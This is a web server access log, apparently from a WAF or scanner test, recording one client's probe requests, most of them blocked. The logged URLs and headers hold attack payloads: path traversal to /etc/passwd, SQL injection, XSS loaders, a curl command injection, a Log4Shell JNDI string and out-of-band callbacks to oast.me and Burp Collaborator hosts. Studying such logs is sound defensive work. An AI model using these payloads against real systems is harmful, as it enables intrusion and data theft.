127.0.0.1 - - [24/Dec/2025:18:38:37 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
172.23.0.4 - - [24/Dec/2025:18:41:33 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:33 +0000] "POST / HTTP/1.1" 400 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:34 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:35 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:35 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:35 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:35 +0000] "POST / HTTP/1.1" 400 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:35 +0000] "POST / HTTP/1.1" 400 552 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:35 +0000] "GET /?a71816cc84=%25C0%25AE%25C0%25AE%25C0%25AF%25C0%25AE%25C0%25AE%25C0%25AFetc%25C0%25AFpasswd HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:35 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:35 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:36 +0000] "GET /?11127f04dc=file:%2F%2F%2Fetc%2F.%2Fpasswd HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:36 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:36 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:36 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:36 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:36 +0000] "POST /clam.php HTTP/1.1" 403 146 "-" "Mozilla/5.0" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "POST /clam.php HTTP/1.1" 403 146 "-" "Mozilla/5.0" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "GET /?25fd20a607=%60curl%20-L%20http:%2F%2F%E2%92%BC%E2%93%84%E2%93%84%E2%92%BC%E2%93%81%E2%92%BA.%E2%92%B8%E2%93%84%E2%93%82%60 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "POST /clam.php HTTP/1.1" 403 146 "-" "Mozilla/5.0" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "GET /?e277a4051c=%28select%2520group_concat%28table_name%2C0x3a%2Ccolumn_name%2C0x5c6e%29%2520from%2520information_schema.columns%2520where%2520table_schema=database%28%29%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:37 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:38 +0000] "GET /?c0d9472bd7=%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F+ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:38 +0000] "GET /?877d55f22e=-1945+%2F%2A%21%2555NiOn%2A%2F%2520%2F%2A%21%2553eLEct%2A%2F+1%2C2%2C3%2C%2527soy%2520vulnerable%2527%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19+--+ HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:38 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:38 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:38 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:38 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "GET / HTTP/1.1" 200 0 "-" "http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/6.17.0.RELEASE iPhone12,8 iOS/14.5.1))" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "GET / HTTP/1.1" 403 146 "-" "${jndi:ldap://${hostName}.w63gecoroprj5um8ypnd7r6in9t0hseg3.oast.me/a}" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@w63gecoroprj5um8ypnd7r6in9t0hseg3.interact.sh" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 [en] (X11, U; OpenVAS-VT 22.4.1)" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "GET / HTTP/1.1" 403 146 "-" "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "GET / HTTP/1.1" 403 146 "-" "Fuzz Faster U Fool v2.0.0" "-"
172.23.0.4 - - [24/Dec/2025:18:41:39 +0000] "GET / HTTP/1.1" 403 146 "-" "Microsoft WinRM Client OpenVASVT" "-"
172.23.0.4 - - [24/Dec/2025:18:41:40 +0000] "GET / HTTP/1.1" 200 0 "-" "mercuryboard_user_agent_sql_injection.nasl'" "-"
172.23.0.4 - - [24/Dec/2025:18:41:40 +0000] "GET /?6e6064689f=javascript:%25ef%25bb%25bfalert%28XSS%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:40 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:40 +0000] "GET / HTTP/1.1" 403 146 "-" "sqlmap/1.7.4#stable (https://sqlmap.org)" "-"
172.23.0.4 - - [24/Dec/2025:18:41:40 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:40 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:40 +0000] "GET /?250cc48db4=%3CsvG%2Fx=%22%3E%22%2FoNloaD=confirm%28%29%2F%2F HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:40 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "GET /?83452d9f00=alert%3F.%28document%3F.cookie%29 HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "GET /?68785ec858=%3Cobject%2Fdata=javascript:alert%28%29%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:41 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:42 +0000] "GET /?d157d34f3a=%3Ca%20href=javas%2526%2399%3Bript:prompt%2526%23x28document.domain%29%3Exss HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:42 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
127.0.0.1 - - [24/Dec/2025:18:41:42 +0000] "GET / HTTP/1.1" 200 0 "-" "curl/7.88.1" "-"
172.23.0.4 - - [24/Dec/2025:18:41:42 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:42 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:42 +0000] "GET /?9f315af792=%22%3E%3Cvideo%3E%3Csource%20onerror=eval%28atob%28http:%2F%2Fsome_host%29%29%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&%2361%3B&%2361%3B%3E HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:42 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:42 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:43 +0000] "GET /?1238474a9d=%3CxssBypass%2Fonpointermove=%28confirm%29%281%29%3EMoveMouseHere HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
172.23.0.4 - - [24/Dec/2025:18:41:43 +0000] "POST / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "-"
